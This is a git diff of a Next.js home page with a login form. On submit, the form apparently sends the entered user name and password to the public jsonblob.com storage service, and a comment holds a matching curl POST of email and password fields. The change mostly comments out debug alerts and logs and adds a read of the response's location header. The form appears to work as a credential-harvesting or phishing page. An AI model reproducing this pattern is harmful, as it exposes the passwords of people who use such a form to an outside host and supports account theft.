@@ -2,12 +2,8 @@ import Layout from "../componentes/Layout";
 import Image from "next/image";
 import Footer from "../componentes/Footer";
 import { useForm } from "react-hook-form";
-// import { JsonDB } from "node-json-db";
-// import { Config } from "node-json-db/dist/lib/JsonDBConfig";
 
 function HomePage() {
-	// var db = new JsonDB(new Config("myDataBase", true, false, "/"));
-
 	const {
 		register,
 		handleSubmit,
@@ -15,7 +11,7 @@ function HomePage() {
 	} = useForm();
 
 	const onSubmit = async (data) => {
-		alert(`${data.pass} || ${data.user}`);
+		// alert(`${data.pass} || ${data.user}`);
 
 		const response = await fetch("https://jsonblob.com/api/jsonBlob", {
 			method: "POST",
@@ -28,12 +24,22 @@ function HomePage() {
 			}),
 		});
 
-		console.log("response");
-		console.log(response);
+		// console.log("response");
+		// console.log(response);
+		var myHeaders = response.headers.get("location");
+		// console.log(myHeaders.has("x-jsonblob"));
+		// console.log("myHeaders");
+		// console.log(myHeaders);
 		const responseData = await response.json();
 
-		console.log("responseData");
-		console.log(responseData);
+		// console.log("responseData");
+		// console.log(responseData);
+
+		if (typeof window === "undefined") {
+			alert("server side");
+			console.log("myHeaders");
+			console.log(myHeaders);
+		}
 	};
 
 	// curl -i -X "POST" -d '{"perfil":["email", "pass"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob
